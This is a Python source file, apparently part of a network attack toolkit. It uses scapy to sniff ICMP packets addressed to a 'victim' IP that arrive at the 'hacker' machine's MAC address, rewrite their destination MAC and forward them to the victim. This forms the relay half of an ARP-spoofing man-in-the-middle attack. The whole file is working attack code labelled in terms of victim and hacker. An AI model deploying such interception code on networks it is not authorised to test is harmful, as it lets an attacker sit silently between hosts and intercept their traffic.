from scapy.all import *
import sys
import _thread

sys.path.append("..")
from common.arp.arp_helper import get_mac_addr
from common.ip.ip_scanner import get_interface_info

IFACE = ''  # interface, used by send_p()
VICTIM_MAC = ''  # victim's mac address, used by packetHandler()
VICTIM_IP = ''  # victim's IP address, used by packetHandler()
HACKER_MAC = ''  # hacker's mac address, used by packetHandler()
PACKET_QUEUE = []  # packet queue, used by packetHandler() and send_p()


class PackageForwarder:
    def __init__(self, iface_, victim_ip_):
        self.iface = iface_
        self.victim_ip = victim_ip_
        self.victim_mac = get_mac_addr(iface_, victim_ip_)
        global IFACE
        IFACE = self.iface
        global VICTIM_IP
        VICTIM_IP = self.victim_ip
        global VICTIM_MAC
        VICTIM_MAC = self.victim_mac
        global HACKER_MAC
        HACKER_MAC = get_interface_info(self.iface)["mac_addr"]

    def get_mac_dst(self):
        return self.victim_mac

    def set_mac_dst(self, victim_mac_):
        self.victim_mac = victim_mac_

    def get_ip_dst(self):
        return self.victim_ip

    def set_ip_dst(self, victim_ip_):
        self.victim_ip = victim_ip_

    def set_interface(self, iface_):
        self.iface = iface_

    def get_interface(self):
        return self.iface

    def ip_packet_sniff(self):
        _thread.start_new_thread(send_p, ())
        sniff(iface=self.iface, filter="icmp", prn=packet_handler)


def packet_handler(pkt):
    """
        callback for sniff function, insert spoofed packet to the packet queue
        :param pkt: incoming packed
        :return: None
    """
    if pkt[Ether].type == 0x800:
        if pkt[IP].dst == VICTIM_IP:
            if pkt[Ether].dst == HACKER_MAC:
                print(pkt.summary())  # print spoofed packet
                pkt[Ether].dst = VICTIM_MAC
                PACKET_QUEUE.insert(0, pkt)


def send_p():
    """
        send packet function, pop a packet from the packet queue and send it with scapy sendp()
        :return: None
    """
    while 1:
        if PACKET_QUEUE:
            mpkt = PACKET_QUEUE.pop()
            sendp(mpkt, iface=IFACE, loop=0)  # forward spoofed packet to the victim
